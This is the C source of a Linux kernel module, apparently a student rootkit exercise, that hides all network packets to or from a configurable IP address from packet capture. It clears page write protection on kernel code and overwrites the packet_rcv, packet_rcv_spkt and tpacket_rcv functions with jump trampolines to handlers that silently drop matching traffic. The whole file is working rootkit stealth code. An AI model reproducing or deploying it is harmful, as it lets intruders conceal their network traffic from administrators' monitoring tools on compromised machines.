#include <linux/module.h>
#include <linux/moduleloader.h>
#include <linux/moduleparam.h>
#include "../sysmap.h"		// for sys_call_table address this is Device spesific
#include <net/ip.h>
#include <linux/inet.h>
#include <linux/in6.h>

#define DRIVER_AUTHOR "Moritz Dötterl <moritz.doetterl@tum.de>"
#define DRIVER_DESC   "A sample kernel module: "


//	ff 25 00 00 00 00       jmpq   *0x200b32(%rip) for jump? Not working....

// x86 assembler for:
// push $0x00000000 ; address to be adjusted
// ret
// results in a jump to my code
char jump_code[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
//char jump_code[6] = { 0xff, 0x25,  0x00, 0x00, 0x00, 0x00 };
unsigned int* jump_addr = (unsigned int*) (jump_code + 1 );

spinlock_t lock_pac_rcv;
spinlock_t lock_pac_rcv_spkt;
spinlock_t lock_tpac_rcv;

unsigned long flags_pac_rcv;
unsigned long flags_pac_rcv_spkt;
unsigned long flags_tpac_rcv;

char code_pac_rcv[6];
char code_pac_rcv_spkt[6];
char code_tpac_rcv[6];

unsigned int hideThisIP;
struct in6_addr hideThisIP6;
bool IPV6 = false;
char* hideThisIPString = "8.8.8.8";
module_param(hideThisIPString, charp, 0000);
MODULE_PARM_DESC(hideThisIPString, "IP address packages to and from should be hidden. Can be either IPv4 or IPv6");


atomic_t in_orig_syscall = ATOMIC_INIT(0);

unsigned long *sys_call_table = (unsigned long*) MAP_sys_call_table; 

// function prototypes
int (*original_packet_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) MAP_packet_rcv;
int (*original_packet_rcv_spkt)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) MAP_packet_rcv_spkt;
int (*original_tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) MAP_tpacket_rcv;

void hook_pac_rcv(void);
void hook_pac_rcv_spkt(void);
void hook_tpac_rcv(void);

void unhook_pac_rcv(void);
void unhook_pac_rcv_spkt(void);
void unhook_tpac_rcv(void);

void parseIP(char* strIP){
	int err = 0;
	u8 IP[4];
	printk("hiding ip: %s\n", strIP);
	err = in4_pton(strIP, -1, IP, -1, NULL);
	if(err == 0) {
		printk("problem Parsing IPV4 addrss, trying IPv6\n");
		err = in6_pton(strIP, -1, hideThisIP6.s6_addr , -1, NULL);
		if(err == 0) {
			printk("Could not parse IP address!!!!!!!!!!\n");
			return;
		}
		printk("found IPv6 address\n");
		IPV6 = true;
	}
	printk("parsed PI!\n");
	hideThisIP = *((unsigned int*) IP);
	printk("hideThisIP = %u\n", hideThisIP);
}

bool needToHide(struct sk_buff* buff)
{
	if (!IPV6){
		if(buff->protocol == htons(ETH_P_IP)){	
			struct iphdr* ihdr = (struct iphdr*) skb_network_header(buff);
			if(ihdr->protocol == IPPROTO_TCP || ihdr->protocol == IPPROTO_UDP || ihdr->protocol == IPPROTO_ICMP) { // ICMP for debug purpuses (to hide pings)
				if(ihdr->saddr == hideThisIP || ihdr->daddr == hideThisIP) {
					//printk("HidePackage: %pI4 -> %pI4 \n", ntohs(ihdr->saddr), ntohs(ihdr->daddr));   // This causes kernel panic
					//printk("Hide: ihdr->protocol %d, ntohsprot: %d, TCP: %d, UDP, %d\n",ihdr->protocol,ntohs(ihdr->protocol), IPPROTO_TCP, IPPROTO_UDP);
					return true;
				}
			}
		}
	}
	else {
		if(buff->protocol == ntohs(34525)) { // IPv6
			struct ipv6hdr* i6hdr = (struct ipv6hdr*) skb_network_header(buff);
			if(ipv6_addr_cmp(&hideThisIP6, &i6hdr->saddr) || ipv6_addr_cmp(&hideThisIP6, &i6hdr->daddr)) {
				//printk("found IPv6 \n");
				//printk("IPv6: %pI6 -> %pI6 \n", i6hdr->saddr, i6hdr->daddr);
				return true;
			}
		}
	}
	return false;
}

int hacked_packet_rcv (struct sk_buff* buff, struct net_device* sdev, struct packet_type* packtype, struct net_device* ddev)
{
	int ret = 0;
	spin_lock_irqsave(&lock_pac_rcv, flags_pac_rcv);
	if(!needToHide(buff)) {
		unhook_pac_rcv();
		ret = original_packet_rcv(buff, sdev, packtype, ddev);
		hook_pac_rcv();	
	}
	spin_unlock_irqrestore(&lock_pac_rcv, flags_pac_rcv);
	return ret;
}

int hacked_packet_rcv_spkt (struct sk_buff* buff, struct net_device* sdev, struct packet_type* packtype, struct net_device* ddev)
{
	int ret = 0;
	spin_lock_irqsave(&lock_pac_rcv_spkt, flags_pac_rcv_spkt);
	if(!needToHide(buff)) {
		unhook_pac_rcv_spkt();
		ret = original_packet_rcv_spkt(buff, sdev, packtype, ddev);
		hook_pac_rcv_spkt();
	}
	spin_unlock_irqrestore(&lock_pac_rcv_spkt, flags_pac_rcv_spkt);
	return ret;

}

int hacked_tpacket_rcv (struct sk_buff* buff, struct net_device* sdev, struct packet_type* packtype, struct net_device* ddev)
{
	int ret = 0;
	spin_lock_irqsave(&lock_tpac_rcv, flags_tpac_rcv);
	if(!needToHide(buff)) {
		unhook_tpac_rcv();
		ret = original_tpacket_rcv(buff, sdev, packtype, ddev);
		hook_tpac_rcv();
	}
	spin_unlock_irqrestore(&lock_tpac_rcv, flags_tpac_rcv);
	return ret;

}


/* Make the page writable */
int make_rw(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;
	return 0;
}

/* Make the page write protected */
int make_ro(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
	return 0;
}

void hook_pac_rcv(void)
{
	make_rw((unsigned long) original_packet_rcv);
	*jump_addr = (unsigned int*) hacked_packet_rcv;	
	memcpy( code_pac_rcv, original_packet_rcv, 6);
	memcpy( original_packet_rcv,jump_code, 6);
	make_ro((unsigned long) original_packet_rcv);
}

void hook_pac_rcv_spkt(void)
{
	make_rw((unsigned long) original_packet_rcv_spkt);
	*jump_addr = (unsigned int*) hacked_packet_rcv_spkt;	
	memcpy( code_pac_rcv_spkt, original_packet_rcv_spkt, 6);
	memcpy( original_packet_rcv_spkt,jump_code, 6);
	make_ro((unsigned long) original_packet_rcv_spkt);
}
void hook_tpac_rcv(void)
{	
	make_rw((unsigned long) original_tpacket_rcv);
	*jump_addr = (unsigned int*) hacked_tpacket_rcv;	
	memcpy( code_tpac_rcv, original_tpacket_rcv, 6);
	memcpy( original_tpacket_rcv,jump_code, 6);
	make_ro((unsigned long) original_tpacket_rcv);
}
void unhook_pac_rcv(void)
{
	make_rw((unsigned long) original_packet_rcv);
	memcpy(original_packet_rcv, code_pac_rcv, 6);
	make_ro((unsigned long) original_packet_rcv);
}
void unhook_pac_rcv_spkt(void)
{
	make_rw((unsigned long) original_packet_rcv_spkt);
	memcpy(original_packet_rcv_spkt, code_pac_rcv_spkt, 6);
	make_ro((unsigned long) original_packet_rcv_spkt);
}
void unhook_tpac_rcv(void)
{
	make_rw((unsigned long) original_tpacket_rcv);
	memcpy(original_tpacket_rcv, code_tpac_rcv, 6);
	make_ro((unsigned long) original_tpacket_rcv);
}
	
static int __init init_mod(void)
{	
	printk("inserting...\n");

	parseIP(hideThisIPString);

	spin_lock_irqsave(&lock_pac_rcv, flags_pac_rcv);
	hook_pac_rcv();
	spin_unlock_irqrestore(&lock_pac_rcv, flags_pac_rcv);

	spin_lock_irqsave(&lock_pac_rcv_spkt, flags_pac_rcv_spkt);
	hook_pac_rcv_spkt();
	spin_unlock_irqrestore(&lock_pac_rcv_spkt, flags_pac_rcv_spkt);

	spin_lock_irqsave(&lock_tpac_rcv, flags_tpac_rcv);
	hook_tpac_rcv();	
	spin_unlock_irqrestore(&lock_tpac_rcv, flags_tpac_rcv);

	printk("Hock is running;\n");

	return 0;
}

static void __exit  exit_mod(void)
{
	printk("exiting...\n");

	spin_lock_irqsave(&lock_pac_rcv, flags_pac_rcv);
	unhook_pac_rcv();
	spin_unlock_irqrestore(&lock_pac_rcv, flags_pac_rcv);

	spin_lock_irqsave(&lock_pac_rcv_spkt, flags_pac_rcv_spkt);
	unhook_pac_rcv_spkt();
	spin_unlock_irqrestore(&lock_pac_rcv_spkt, flags_pac_rcv_spkt);

	spin_lock_irqsave(&lock_tpac_rcv, flags_tpac_rcv);
	unhook_tpac_rcv();	
	spin_unlock_irqrestore(&lock_tpac_rcv, flags_tpac_rcv);

	if(atomic_read(&in_orig_syscall)!=0) 
		printk("waiting for instance to be finished %d\n", atomic_read(&in_orig_syscall));
	while(atomic_read(&in_orig_syscall)!=0){
		msleep(10);
	}
	printk("hook is not running anymore\n");
} 

module_init(init_mod);
module_exit(exit_mod);

MODULE_LICENSE("GPL"); 				/* Declare it as GPL License */
MODULE_AUTHOR(DRIVER_AUTHOR);		/* Declare the Author        */
MODULE_DESCRIPTION(DRIVER_DESC);	/* Short description         */
